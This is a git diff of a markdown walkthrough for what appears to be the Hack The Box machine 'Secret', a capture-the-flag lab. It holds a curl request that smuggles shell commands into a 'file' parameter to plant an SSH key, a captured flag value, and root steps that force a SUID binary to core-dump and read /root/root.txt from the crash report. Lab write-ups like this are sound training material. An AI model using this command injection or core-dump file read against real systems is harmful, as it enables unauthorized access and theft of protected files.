@@ -108,16 +108,31 @@ curl \
   -G \ # send data values through GET instead of POST
   --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" \ # encode data parameters
   'http://10.10.11.120/api/logs'
-
 ```
+See ![200_ssh_key](Screenshots/200_add_ssh_key.png)
 
-key should be present now ssh into dasith!
+Key should be present now ssh into dasith! See ![ssh_dasith](Screenshots/ssh_dasith.png)
+key:: f49628ceda5c0f784c6ae947154b764b
 
-TODO:: curl cmd and ssh into server
-
+##**Root::**##
+    + /opt has count with SUID
+        ./count /root :: See ![](Screenshots/secret_count.png)
+    + strace && gdb dont help much - suid doesnt stay gdb. strace map is private
++ Because valgrind.log is present, "core dump" is exploitable. valgrind is a suite of tools for debugging! lucky us!
+See ![core_dump](Screenshots/core_dump_valgrind.png)
+```
+./count /root/root.txt
+ctrl + z
+ps && kill -BUS <PID#> ##Apparently -BUS is same as -SIGSEGV
+fg ::
+"Bus error (core dumped)
+```
++ crash reports are in `/var/crash` && can be unpacked with `apport-unpack` w/ `apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report`
++ binary files so xxd is needed.
 
 ---
 ##**References:**###
 [jwt.IO](JWT.io) 
 [guide](https://drt.sh/posts/htb-secret/)
-
+[jwt-cracker](https://github.com/lmammino/jwt-cracker)
+[valgrind](https://www.man7.org/linux/man-pages/man1/valgrind.1.html)
